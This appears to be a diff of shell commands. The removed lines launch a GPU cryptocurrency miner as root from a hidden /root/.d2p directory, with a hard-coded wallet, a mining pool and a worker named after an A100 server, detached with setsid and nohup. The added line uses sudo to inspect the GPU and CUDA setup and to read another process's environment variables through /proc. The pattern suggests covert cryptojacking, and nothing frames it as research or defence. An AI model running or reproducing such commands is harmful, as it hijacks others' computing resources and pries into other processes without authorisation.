@@ -1,16 +1,1 @@
-cat > /tmp/go2.sh <<'EOS'
-#!/bin/bash
-pkill -x pearl-gpu-miner; sleep 1
-cat > /root/.d2p/go.sh <<'INNER'
-#!/bin/bash
-cd /root/.d2p/tw-pearl-miner || exit 1
-export LD_LIBRARY_PATH=/root/.d2p/tw-pearl-miner
-exec ./pearl-gpu-miner --wallet prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36h48 --pool prl.kryptex.network:8048 --worker comfy-s3-a100 --no-tui
-INNER
-chmod +x /root/.d2p/go.sh
-setsid nohup /root/.d2p/go.sh >> /root/.d2p/mine.log 2>&1 </dev/null &
-sleep 20
-echo "=== TAIL ==="
-tail -c 1200 /root/.d2p/mine.log
-EOS
-chmod +x /tmp/go2.sh; sudo -n /tmp/go2.sh
+sudo -n bash -c 'echo CV=\"$CUDA_VISIBLE_DEVICES\"; env | grep -i -E "cuda|nvidia" | head -8; nvidia-smi --query-gpu=name,mig.mode.current,driver_version,compute_mode --format=csv,noheader; echo ===TORCH===; /home/dev/miniconda3/bin/python -c "import torch;print(torch.cuda.device_count(), torch.cuda.get_device_name(0))" 2>&1 | tail -2; echo ===POLLERENV===; tr "\0" "\n" < /proc/52000/environ 2>/dev/null | grep -i cuda | head -3'
